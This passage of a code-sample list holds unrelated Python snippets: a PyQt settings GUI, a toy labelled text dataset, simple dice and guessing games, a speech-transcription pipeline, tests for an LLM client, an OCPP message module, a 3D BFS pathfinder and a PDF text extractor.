url({REMOVE});}\".replace('{REMOVE}', GetPath('media/remove.png')).replace('{CHECK}', GetPath('media/check.png')))\r\n        self.cfon_checkbox.setChecked(True)\r\n        layout.addWidget(self.cfon_checkbox, alignment=Qt.AlignCenter)\r\n        self.cfon_checkbox.stateChanged.connect(self.cfon_state)\r\n\r\n        self.scan_checkbox = QCheckBox('SCAN Mode', self)\r\n        self.scan_checkbox.setStyleSheet(\"QCheckBox {color: white;text-align: center;}QCheckBox::indicator {width: 20px;height: 20px;}QCheckBox::indicator:checked {image: url({CHECK});}QCheckBox::indicator:unchecked {image: url({REMOVE});}\".replace('{REMOVE}', GetPath('media/remove.png')).replace('{CHECK}', GetPath('media/check.png')))\r\n        layout.addWidget(self.scan_checkbox, alignment=Qt.AlignCenter)\r\n\r\n        self.port_textbox = QSpinBox(self)\r\n        self.port_textbox.setAlignment(Qt.AlignCenter)\r\n        self.port_textbox.setButtonSymbols(QAbstractSpinBox.NoButtons) \r\n        self.port_textbox.setRange(1024, 65535)\r\n        self.port",
    "negative_data = 0\nnegative_description = \"I shouldn\\'t consider\"\n\npositive_data = 1\npositive_description = \"I should consider\"\n\ndef get_dataset():\n    return [\n        (\"Text example\", positive_data),\n        (\" Space on start\", positive_data),\n        (\" more cases with spaces\", positive_data),\n        (\"other with nothing on start\", positive_data),\n        (\"adding new cases with nothing\", positive_data),\n        (\" adding new cases with space\", positive_data),\n        (\"cases with nothing on start i should consider\", positive_data),\n        (\" trying with more cases\", positive_data),\n        (\"_ some text\", negative_data),\n        (\"_ other text\", negative_data),\n        (\"__ other some text\", negative_data),\n        (\"__ new other text\", negative_data),\n        (\"__ trying other cases\", negative_data),\n        (\"__ new cases\", negative_data),\n        (\"[] trying this one\", negative_data),\n        (\"[] cases without X\", negative_data),\n        (\"[] other case with brackets\", negative_data),\n        (\"[ ] brackets with space\", negative_data),\n        (\"[ ] other cases without X\", negative_data),\n        (\"[ ] other case with brackets and spaces\", negative_data),\n        (\"__ other try\", negative_data),\n        (\"__ cases with two underscores\", negative_data),\n        (\"__ train more with this cases\", negative_data),\n        (\"__ more case with underscores\", negative_data),\n        (\"__ testing this one\", negative_data),\n        (\"__ add some more data\", negative_data),\n        (\"_X_ I should consider\", positive_data),\n        (\"_X_ should consider\", positive_data),\n        (\"_X_ other case with X in two underscores\", positive_data),\n        (\"_X_ other some data\", positive_data),\n        (\"_X_ trying add more cases\", positive_data),\n        (\"_X_ Other case positive\", positive_data),\n        (\"I have to import this\", positive_data),\n        (\"[x] I need this\", positive_data),\n        (\"[ X ] I also need this\", positive_data),\n        (\"Texts without mark should be consider\", positive_data),\n        (\"More cases with nothing\", positive_data),\n         (\"__ triple underscores\", negative_data),\n        (\"_X_ Triple underscores with mark\", positive_data),\n        (\"[x] Triple underscores with mark\", positive_data),\n        (\"[ x ] cases with mark and space\", positive_data),\n        (\"[ x ] cases with mark and space\", positive_data),\n        (\"[ x ] some data\", positive_data),\n        (\"[X] Triple underscores with mark\", positive_data),\n        (\"___ quadruple underscores\", negative_data),\n        (\"_X_ Quadruple underscores with mark\", positive_data),\n        (\"[x] Quadruple underscores with mark\", positive_data),\n        (\"[X] Quadruple underscores with mark\", positive_data),\n        (\"Text without special characters\", positive_data),\n        (\"More examples without special characters\", positive_data),\n        (\"This is a positive example\", positive_data),\n        (\"Another positive instance\", positive_data),\n        (\"Positive case without marks\", positive_data),\n        (\"Some case without marks\", positive_data),\n        (\"New case without mark\", positive_data),\n        (\"positive case when not have mark\", positive_data),\n        (\"[ ] new negative datas\", negative_data),\n        (\"[ ] should be negative\", negative_data),\n        (\"[ ] exclude case\", negative_data),\n        (\"__ new removable cases\", negative_data),\n        (\"__ other training dataset\", negative_data),\n        (\"__ new values\", negative_data),\n        (\"__ test\", negative_data),\n        (\"__ trying this one\", negative_data),\n        (\"__ some data\", negative_data),\n        (\"__ testing this\", negative_data),\n        (\"__ more case with underscores\", negative_data),\n        (\"__ testing this one\", negative_data),\n        (\"__ add some more data\", negative_data),\n        (\"Extra positive example\", positive_data),\n        (\"Additional positive case\", positive_data),\n        (\"Positive instance without marks\", positive_data),\n        (\"New positive scenario\", positive_data),\n        (\"Yet another positive example\", positive_data),\n        (\"[ ] negative case with space\", negative_data),\n        (\"[ ] another negative scenario\", negative_data),\n        (\"Negative instance without marks\", positive_data),\n        (\"Another negative example\", positive_data),\n        (\"Additional negative case\", positive_data),\n        (\"__ more negative cases with underscores\", negative_data),\n        (\"__ even more negative examples\", negative_data),\n        (\"__ additional negative instances\", negative_data),\n        (\"[x] Positive case with mark\", positive_data),\n        (\"[ x ] Positive instance with mark and space\", positive_data),\n        (\"[x] Another positive example with mark\", positive_data),\n        (\"[ X ] Positive case with mark and space\", positive_data),\n        (\"[x] Additional positive instance with mark\", positive_data),\n        (\"[x] Extra positive example with mark\", positive_data),\n        (\"_X_ Another positive scenario with X\", positive_data",
    "import random\r\n\r\n\r\ndef roll():\r\n    min_value = 1\r\n    max_value = 6\r\n    rolling = random.randint(min_value, max_value)\r\n\r\n    return rolling\r\n\r\n\r\nwhile True:\r\n    players = input(\"Wie viele Spieler spielen mit? (2-4): \")\r\n    if players.isdigit():\r\n        players = int(players)\r\n        if 2 <= players <= 4:\r\n            break\r\n        else:\r\n            print(\"Es k\u00f6nnen nur zwei bis vier Spieler mitspielen.\")\r\n    else:\r\n        print(\"Versuch es nochmal.\")\r\n\r\nmax_score = 50\r\nplayer_scores = [0 for _ in range(players)]\r\n\r\nwhile max(player_scores) < max_score:\r\n    for player_idx in range(players):\r\n        print(\"\\nSpieler\", player_idx + 1, \"ist jetzt dran!\\n\")\r\n        print(\"Dein Score betr\u00e4gt:\", player_scores[player_idx], \"\\n\")\r\n        current_score = 0\r\n\r\n        while True:\r\n            should_roll = input(\"\\nM\u00f6chtest du w\u00fcrfeln (y/n)? \")\r\n            if should_roll.lower() != \"y\":\r\n                break\r\n\r\n            value = roll()\r\n            if value == 1:\r\n                print(\"\\nDu hast eine 1 gew\u00fcrfelt! Der n\u00e4chste Spieler ist dran!\")\r\n                current_score = 0\r\n                break\r\n            else:\r\n                current_score += value\r\n                print(\"\\nDu hast eine\", value, \"gew\u00fcrfelt!\")\r\n\r\n            print(\"Dein Score betr\u00e4gt im Moment:\", current_score)\r\n\r\n        player_scores[player_idx] += current_score\r\n        print(\"\\nSpieler\", player_idx + 1, \"hat einen Score von:\", player_scores[player_idx])\r\n\r\nmax_score = max(player_scores)\r\nwinning_idx = player_scores.index(max_score)\r\nprint(\"Spieler\", winning_idx + 1, \"hat gewonnen mit einem Score von:\", max_score)\r\n",
    "#\u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438 \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u044b\u0445 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0445\ndef digit(a,b):\n    # \u0415\u0441\u043b\u0438 \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u044f\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0447\u0438\u0441\u043b\u043e\u043c, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 True\n    while a.replace(\"-\",\"\").replace(\".\",\"\").isdigit() and b.replace(\"-\",\"\").replace(\".\",\"\").isdigit():\n        return True\n    # \u0415\u0441\u043b\u0438 \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u043d\u0435 \u044f\u0432\u043b\u044f\u044e\u0442\u0441\u044f \u0447\u0438\u0441\u043b\u043e\u043c, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442\u0441\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 False\n    else:\n        print(f\"'{a}' \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u043e\u0439 \u0442\u043e\u0447\u043a\u0438. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0435\u0449\u0435 \u0440\u0430\u0437\")\n        return False\n\n# \u0412\u0432\u043e\u0434\u0438\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 x1 \u0438 y1\nx1 = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 x: \")\ny1 = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 y: \")\n\nwhile digit(x1,y1) == True: # \u041f\u043e\u043a\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u044f digit \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 True (\u0442\u043e \u0435\u0441\u0442\u044c \u043f\u043e\u043a\u0430 \u0432\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f \u0443\u0441\u043b\u043e\u0432\u0438\u0435 \u0441 4 \u0441\u0442\u0440\u043e\u043a\u0438):\n    x = float(x1) # \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u044b\u0432\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e x1 \u0438\u0437 str \u0432 float\n    y = float(y1) # \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u044b\u0432\u0430\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e y1 \u0438\u0437 str \u0432 float\n# \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044f \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044e if-elif-else, \u043f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435, \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u044b\u0435 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u043c\n    # \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f x \u043c\u0435\u043d\u044c\u0448\u0435 0 \u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f y \u0431\u043e\u043b\u044c\u0448\u0435 0\n    if x < 0 and y > 0:\n        print(\"2 \u0447\u0435\u0442\u0432\u0435\u0440\u0442\u044c\")\n    # \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f x \u0431\u043e\u043b\u044c\u0448\u0435 0 \u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f y \u0431\u043e\u043b\u044c\u0448\u0435 0\n    elif x > 0 and y > 0:\n        print(\"1 \u0447\u0435\u0442\u0432\u0435\u0440\u0442\u044c\")\n    # \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f x \u043c\u0435\u043d\u044c\u0448\u0435 0 \u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f y \u043c\u0435\u043d\u044c\u0448\u0435 0\n    elif x < 0 and y < 0:\n        print(\"3 \u0447\u0435\u0442\u0432\u0435\u0440\u0442\u044c\")\n    # \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f x \u0431\u043e\u043b\u044c\u0448\u0435 0 \u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f y \u043c\u0435\u043d\u044c\u0448\u0435 0\n    elif x > 0 and y < 0:\n        print(\"4 \u0447\u0435\u0442\u0432\u0435\u0440\u0442\u044c\")\n    # \u0415\u0441\u043b\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 \u043d\u0435 \u043f\u0440\u043e\u0445\u043e\u0434\u044f\u0442 \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0443 \u043d\u0438 \u043f\u043e \u043e\u0434\u043d\u043e\u043c\u0443 \u0443\u0441\u043b\u043e\u0432\u0438\u044e\n    else:\n        print(\"0 \u043d\u0435 \u0432\u0445\u043e\u0434\u0438\u0442 \u0432 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u043d\u0443\u044e \u043f\u043b\u043e\u0441\u043a\u043e\u0441\u0442\u044c. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0435\u0449\u0435 \u0440\u0430\u0437\")\n    break # \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440 break \u0434\u043b\u044f \u043f\u0440\u0435\u0440\u044b\u0432\u0430\u043d\u0438\u044f \u0446\u0438\u043a\u043b\u0430 while-true, \u0438\u043d\u0430\u0447\u0435 \u0446\u0438\u043a\u043b \u0431\u0443\u0434\u0435\u0442 \u0431\u0435\u0441\u043a\u043e\u043d\u0435\u0447\u043d\u044b\u043c\n\n",
    "import torch\nfrom dotenv import dotenv_values\nfrom pyannote.audio import Pipeline\nfrom transformers import AutoModelForSpeechSeq2Seq, AutoProcessor, pipeline\n\ndevice = \"cuda:0\" if torch.cuda.is_available() else \"cpu\"\n# Diarization Pipeline START #\nconfig = dotenv_values(\".env\")\ndiarization_pipeline = Pipeline.from_pretrained(\"pyannote/speaker-diarization-3.1\",\n                                                use_auth_token=config.get(\"HUGGINGFACE_ACCESS_TOKEN\"))\n# send pipeline to GPU (when available)\ndiarization_pipeline.to(torch.device(device))\n# Diarization Pipeline END #\n\n# Audio Transcription Pipline START #\n\ntorch_dtype = torch.float16 if torch.cuda.is_available() else torch.float32\nmodel_id = \"openai/whisper-large-v3\"\nmodel = AutoModelForSpeechSeq2Seq.from_pretrained(model_id, torch_dtype=torch_dtype, low_cpu_mem_usage=True,\n                                                  use_safetensors=True)\nmodel.to(device)\nprocessor = AutoProcessor.from_pretrained(model_id)\naudio_transcription_pipeline = pipeline(\"automatic-speech-recognition\", model=model_id, tokenizer=processor.tokenizer,\n                                        feature_extractor=processor.feature_extractor, max_new_tokens=128,\n                                        chunk_length_s=30, batch_size=16, return_timestamps=True,\n                                        torch_dtype=torch_dtype, device=device, )\n\n# Audio Transcription Pipline END #\n",
    "import pytest\nfrom unittest.mock import patch, Mock\n\nfrom test_utils.llm_mock import (\n    construct_mock_from_path,\n    get_nested_attribute,\n)\nfrom l2m2.client import LLMClient\n\nMODULE_PATH = \"l2m2.client.llm_client\"\n\n\n# Make sure all the providers are available\ndef test_provider_imports():\n    from openai import OpenAI  # noqa: F401\n    from cohere import Client as CohereClient  # noqa: F401\n    from anthropic import Anthropic  # noqa: F401\n    from groq import Groq  # noqa: F401\n    import google.generativeai as google  # noqa: F401\n    import replicate  # noqa: F401\n\n\n@pytest.fixture\ndef llm_client():\n    \"\"\"Fixture to provide a clean LLMManager instance for each test.\"\"\"\n    return LLMClient()\n\n\n# -- Tests for initialization and provider management -- #\n\n\ndef test_init(llm_client):\n    assert llm_client.API_KEYS == {}\n    assert llm_client.active_providers == set()\n    assert llm_client.active_models == set()\n\n\ndef test_init_with_providers():\n    llm_client = LLMClient({\"openai\": \"test-key-openai\", \"cohere\": \"test-key-cohere\"})\n    assert llm_client.API_KEYS == {\n        \"openai\": \"test-key-openai\",\n        \"cohere\": \"test-key-cohere\",\n    }\n    assert llm_client.active_providers == {\"openai\", \"cohere\"}\n    assert \"gpt-4-turbo\" in llm_client.active_models\n    assert \"command-r\" in llm_client.active_models\n    assert \"claude-3-opus\" not in llm_client.active_models\n\n\ndef test_init_with_providers_invalid():\n    with pytest.raises(ValueError):\n        LLMClient({\"invalid_provider\": \"some-key\", \"openai\": \"test-key-openai\"})\n\n\ndef test_getters(llm_client):\n    llm_client.add_provider(\"openai\", \"test-key-openai\")\n    llm_client.add_provider(\"cohere\", \"test-key-cohere\")\n    assert llm_client.get_active_providers() == {\"openai\", \"cohere\"}\n\n    active_models = llm_client.get_active_models()\n    assert \"gpt-4-turbo\" in active_models\n    assert \"command-r\" in active_models\n    assert \"claude-3-opus\" not in active_models\n\n    available_providers = LLMClient.get_available_providers()\n    assert llm_client.active_providers.issubset(available_providers)\n    assert len(available_providers) > len(llm_client.active_providers)\n\n    available_models = LLMClient.get_available_models()\n    assert llm_client.active_models.issubset(available_models)\n    assert len(available_models) > len(llm_client.active_models)\n\n\ndef test_add_provider(llm_client):\n    llm_client.add_provider(\"openai\", \"test-key-openai\")\n    assert \"openai\" in llm_client.active_providers\n    assert \"gpt-4-turbo\" in llm_client.active_models\n\n\ndef test_add_provider_invalid(llm_client):\n    with pytest.raises(ValueError):\n        llm_client.add_provider(\"invalid_provider\", \"some-key\")\n\n\ndef test_remove_provider(llm_client):\n    llm_client.add_provider(\"openai\", \"test-key-openai\")\n    llm_client.remove_provider(\"openai\")\n    assert \"openai\" not in llm_client.active_providers\n    assert \"gpt-4-turbo\" not in llm_client.active_models\n\n\ndef test_remove_provider_not_active(llm_client):\n    with pytest.raises(ValueError):\n        llm_client.remove_provider(\"openai\")\n\n\n# -- Tests for call -- #\n\n\ndef _generic_test_call(\n    llm_client,\n    mock_provider,\n    call_path,\n    response_path,\n    provider_key,\n    model_name,\n):\n    mock_client = Mock()\n\n    # Dynamically get the mock call and response objects based on the delimited paths\n    mock_call = get_nested_attribute(mock_client, call_path)\n    if response_path == \"\":\n        # Stopgap for replicate, TODO fix this!\n        mock_call.return_value = [\"response\"]\n    else:\n        mock_response = construct_mock_from_path(response_path, \"response\")\n        mock_call.return_value = mock_response\n\n    mock_provider.return_value = mock_client\n\n    llm_client.add_provider(provider_key, \"fake-api-key\")\n    response_default = llm_client.call(prompt=\"Hello\", model=model_name)\n    response_custom = llm_client.call(\n        prompt=\"Hello\",\n        model=model_name,\n        system_prompt=\"System prompt\",\n        temperature=0.5,\n        max_tokens=100,\n    )\n\n    assert response_default == \"response\"\n    assert response_custom == \"response\"\n\n\n@patch(f\"{MODULE_PATH}.OpenAI\")\ndef test_call_openai(mock_openai, llm_client):\n    _generic_test_call(\n        llm_client=llm_client,\n        mock_provider=mock_openai,\n        call_path=\"chat.completions.create\",\n        response_path=\"choices[0].message.content\",\n        provider_key=\"openai\",\n        model_name=\"gpt-4-turbo\",\n    )\n\n\n@patch(f\"{MODULE_PATH}.Anthropic\")\ndef test_call_anthropic(mock_anthropic, llm_client):\n    _generic_test_call(\n        llm_client=llm_client,\n        mock_provider=mock_anthropic,\n        call_path=\"messages.create\",\n        response_path=\"content[0].text\",\n        provider_key=\"anthropic\",\n        model_name=\"claude-3-opus\",\n    )\n\n\n@patch(f\"{MODULE_PATH}.CohereClient\")\ndef test_call_cohere(mock_cohere, llm_client):\n    _generic_test_call(\n        llm_client=llm_client,\n        mock_provider=mock_cohere,\n        call_path=\"chat\",\n        response_path=\"text\"",
    "import random\r\n\r\nprint(\"Welcome to the Guess the number!!!\")\r\nprint(\"------------------------------------\")\r\nname = input(\"Please Type Your Name: \")\r\nprint(\"------------------------------------\")\r\nprint(f\"Hello, {name}, Please Choose A Difficulty\")\r\nprint(\"------------------------------------\")\r\nprint(\"1 = Baby Mode\")\r\nprint(\"2 = Regular\")\r\nprint(\"3 = Hard\")\r\nprint(\"------------------------------------\")\r\n\r\nmode = int(input(f\"Please Enter Difficulty, {name}: \"))\r\n\r\nprint(\"------------------------------------\")\r\n\r\n##MODE SELECTION\r\n##Based on Mode selected gives desired difficultys like more lives and a smaller\r\nif mode == 1:\r\n    print(\"------------------------------------\")\r\n    print(\"You Have Chosen Baby Mode!!! \ud83d\udc76\ud83d\udc76\")\r\n    print(\"------------------------------------\")\r\n    a = random.randint(1, 10)\r\n    lives = 3\r\n    ##gives message to choose number once mode had been selected\r\nelif mode == 2:\r\n    print(\"------------------------------------\")\r\n    print(\"You Have Chosen Regular!!! \ud83d\ude0e\ud83d\ude0e \")\r\n    print(\"------------------------------------\")\r\n    a = random.randint(1, 50)\r\n    lives = 3\r\nelif mode == 3:\r\n    print(\"------------------------------------\")\r\n    print(\"You Have Chosen Hard Mode!!! \ud83d\udc79\ud83d\udc79\")\r\n    print(\"------------------------------------\")\r\n    a = random.randint(1, 100)\r\n    lives = 4\r\nelse:\r\n    print(\"------------------------------------\")\r\n    print(\"Somthing Went Wrong...\")\r\n    print(\"------------------------------------\")\r\n\r\nguess = int(input(\"Guess the Number: \"))\r\n\r\nwhile guess != a and lives != 0:\r\n    if guess > a:\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        print(\"You Have Guessed to High\")\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        guess = int(input(\"Guess the Number: \"))\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        lives = lives - 1\r\n        print(f\"{name}, has {lives} left...\")\r\n    elif guess < a:\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        print(\"You Have Guessed to Low\")\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        guess = int(input(\"Guess the Number: \"))\r\n        print(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\")\r\n        lives = lives - 1\r\n        print(f\"{name}, has {lives} lives left...\")\r\n\r\nif guess == a:\r\n    print(\"------------------------------------\")\r\n    print(\"You Guessed The Write Number You Won \ud83e\udd73\ud83c\udf8a\")\r\n    print(\"------------------------------------\")\r\n\r\nif lives == 0:\r\n    print(\"------------------------------------\")\r\n    print(\"YOU FAILED \ud83d\ude2d\ud83d\ude2d\")\r\n    print(\"------------------------------------\")\r\n    print(f\"The Answer is **{a}**\")\r\n    print(\"------------------------------------\")\r\n    print(f\"{name}, You Have {lives}\u2764\ufe0f Lives Left...\")\r\n    print(\"------------------------------------\")\r\n",
    "# Copyright (c) Quectel Wireless Solution, Co., Ltd.All Rights Reserved.\r\n#\r\n# Licensed under the Apache License, Version 2.0 (the \"License\");\r\n# you may not use this file except in compliance with the License.\r\n# You may obtain a copy of the License at\r\n#\r\n#     http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n# Unless required by applicable law or agreed to in writing, software\r\n# distributed under the License is distributed on an \"AS IS\" BASIS,\r\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n# See the License for the specific language governing permissions and\r\n# limitations under the License.\r\n\r\n\"\"\"\r\n@file      : messages.py\r\n@author    : Jack Sun (jack.sun@quectel.com)\r\n@brief     : <Description>\r\n@version   : v1.0.0\r\n@date      : 2024-04-23 15:57:26\r\n@copyright : Copyright (c) 2024\r\n\"\"\"\r\n\r\nimport ujson\r\n\r\nfrom usr.ocpp.v16 import call, call_result\r\nfrom usr.ocpp.dataclasses import asdict, is_dataclass, validate_dataclass\r\n\r\nfrom usr.ocpp.exceptions import (\r\n    FormatViolationError,\r\n    OCPPError,\r\n    PropertyConstraintViolationError,\r\n    ProtocolError,\r\n    TypeConstraintViolationError,\r\n    UnknownCallErrorCodeError,\r\n    ValidationError,\r\n    SchemaValidationError,\r\n)\r\n\r\n\"\"\" Module containing classes that model the several OCPP messages types. It\r\nalso contain some helper functions for packing and unpacking messages.  \"\"\"\r\n\r\n\r\nclass MessageType:\r\n    \"\"\"Number identifying the different types of OCPP messages.\"\"\"\r\n\r\n    #: Call identifies a request.\r\n    Call = 2\r\n\r\n    #: CallResult identifies a successful response.\r\n    CallResult = 3\r\n\r\n    #: CallError identifies an erroneous response.\r\n    CallError = 4\r\n\r\n\r\ndef unpack(msg):\r\n    \"\"\"\r\n    Unpacks a message into either a Call, CallError or CallResult.\r\n    \"\"\"\r\n    try:\r\n        msg = ujson.loads(msg)\r\n    except Exception:\r\n        raise FormatViolationError(\r\n            None, {\"cause\": \"Message is not valid JSON\", \"ocpp_message\": msg}\r\n        )\r\n\r\n    if not isinstance(msg, list):\r\n        raise ProtocolError(\r\n            None,\r\n            {\r\n                \"cause\": (\r\n                    \"OCPP message hasn't the correct format. It \"\r\n                    \"should be a list, but got '{}' \"\r\n                    \"instead\".format(type(msg))\r\n                )\r\n            }\r\n        )\r\n\r\n    for cls in [Call, CallResult, CallError]:\r\n        try:\r\n            if msg[0] == cls.message_type_id:\r\n                return cls(*msg[1:])\r\n        except IndexError:\r\n            raise ProtocolError(\r\n                None, {\"cause\": \"Message does not contain MessageTypeId\"}\r\n            )\r\n        except TypeError:\r\n            raise ProtocolError(None, {\"cause\": \"Message is missing elements.\"})\r\n\r\n    raise PropertyConstraintViolationError(\r\n        None, {\"cause\": \"MessageTypeId '{}' isn't valid\".format(msg[0])}\r\n    )\r\n\r\n\r\ndef pack(msg):\r\n    \"\"\"\r\n    Returns the JSON representation of a Call, CallError or CallResult.\r\n\r\n    It just calls the 'to_json()' method of the message. But it is here mainly\r\n    to complement the 'unpack' function of this module.\r\n    \"\"\"\r\n    return msg.to_json()\r\n\r\n\r\ndef validate_payload(message, ocpp_version):\r\n    \"\"\"Validate the payload of the message using JSON schemas.\"\"\"\r\n    if type(message) not in [Call, CallResult]:\r\n        raise ValidationError(\r\n            None,\r\n            \"Payload can't be validated because message \"\r\n            \"type. It's '{}', but it should \"\r\n            \"be either 'Call'  or 'CallResult'.\".format(type(message))\r\n        )\r\n\r\n    try:\r\n        _cls = None\r\n        if type(message) is Call:\r\n            _cls = getattr(call, message.action + \"Payload\")\r\n        elif type(message) is CallResult:\r\n            _cls = getattr(call_result, message.action + \"Payload\")\r\n        validate_dataclass(message.payload, _cls)\r\n    except SchemaValidationError as e:\r\n        if e.validator == \"type\":\r\n            raise TypeConstraintViolationError(\r\n                None, {\"cause\": e.message, \"ocpp_message\": message}\r\n            )\r\n        elif e.validator == \"additionalProperties\":\r\n            raise FormatViolationError(\r\n                None, {\"cause\": e.message, \"ocpp_message\": message}\r\n            )\r\n        elif e.validator == \"required\":\r\n            raise ProtocolError(None, {\"cause\": e.message})\r\n\r\n        elif e.validator == \"maxLength\":\r\n            raise TypeConstraintViolationError(\r\n                None, {\"cause\": e.message, \"ocpp_message\": message}\r\n            ) from e\r\n        else:\r\n            raise FormatViolationError(\r\n                None,\r\n                {\r\n                    \"cause\": \"Payload '{}' for action '{}' is not valid: {}\".format(\r\n                        message.payload, message.action, e\r\n                    ),\r\n                    \"ocpp_message\": message\r\n                }\r\n            )\r\n\r\n\r\nclass Call:\r\n    \"\"\"A Call is a type of message that initiate a request/response sequence.\r\n    Both central systems and charge points can send ",
    "from collections import deque\nimport numpy as np\n \ndef isValid(vis, floor, row, col):\n    #Cell out of bounds\n    if floor > (len(vis) - 1) or floor < 0 or row > (len(vis[len(vis)-1]) -1) or row < 0 or col > (len(vis[len(vis)-1][0]) -1) or col < 0:\n        return False\n    #Cell already visited\n    if (vis[floor][row][col] == True):\n        return False \n    # Otherwise\n    return True\n\ndef bfs(grid, start, end):\n    vis = np.zeros_like(grid, dtype=bool)\n    queue = deque()\n    queue.append(start)\n    vis[start] = True\n\n    path_steps = []\n    border_steps = []\n\n\n    parent = {}\n    while queue:\n        border = []\n        curr = queue.popleft()\n        path_steps.append(reconstructPath(parent, start, curr))\n        if curr == end:\n            break\n        # Check adjacent cells\n        for dr, dc, dz in [(-1, 0, 0), (1, 0, 0), (0, 0, -1), (0, 0, 1), (0, -1, 0), (0, 1, 0),\n                            (0, -1, -1), (0, -1, 1), (0, 1, -1), (0, 1, 1)]:\n            newr, newc, newz = curr[0] + dr, curr[1] + dc, curr[2] + dz\n            if isValid(vis,newr, newc, newz) and grid[newr][newc][newz]:\n                queue.append((newr, newc, newz))\n                vis[newr][newc][newz] = True\n                parent[(newr, newc, newz)] = curr\n                border.append((newr, newc, newz))\n        border_steps.append(border)\n\n    # Reconstruct path\n    #ERROR IF PATH DOES NOT EXIST!\n    path_steps.append(reconstructPath(parent, start, end))\n    border_steps.append(None)\n    return path_steps, border_steps\n\n\ndef reconstructPath(parent, start, end):\n    path = []\n    curr = end\n    while curr != start:\n        path.append(curr)\n        curr = parent.get(curr)\n        if curr is None:\n            return None\n    path.append(start)\n    path.reverse()\n    return path\n\n",
    "from pdfminer.converter import TextConverter\r\nfrom pdfminer.pdfinterp import PDFPageInterpreter\r\nfrom pdfminer.pdfinterp import PDFResourceManager\r\nfrom pdfminer.layout import LAParams\r\nfrom pdfminer.pdfpage import PDFPage\r\nimport io\r\nimport spacy\r\nfrom spacy.matcher import Matcher\r\nimport re \r\n#from transformers import AutoTokenizer, AutoModelForTokenClassification\r\n#from transformers import pipeline\r\nimport pandas as pd\r\n#replace with proper path\r\nfile_path = r\"path/to/pdf\"\r\ntext = ''\r\n\r\ndef remove_unicode(text):\r\n    cleaned_text = text.encode('ascii', 'ignore').decode('ascii')\r\n    return cleaned_text\r\n\r\ndef extract_text_from_pdf(pdf_path):\r\n    with open(pdf_path, 'rb') as fh:\r\n        # iterate over all pages of PDF document\r\n        for page in PDFPage.get_pages(fh, caching=True, check_extractable=True):\r\n            # creating a resource manager\r\n            resource_manager = PDFResourceManager()\r\n            \r\n            # create a file handle\r\n            fake_file_handle = io.StringIO()\r\n            \r\n            # creating a text converter object\r\n            converter = TextConverter(\r\n                                resource_manager, 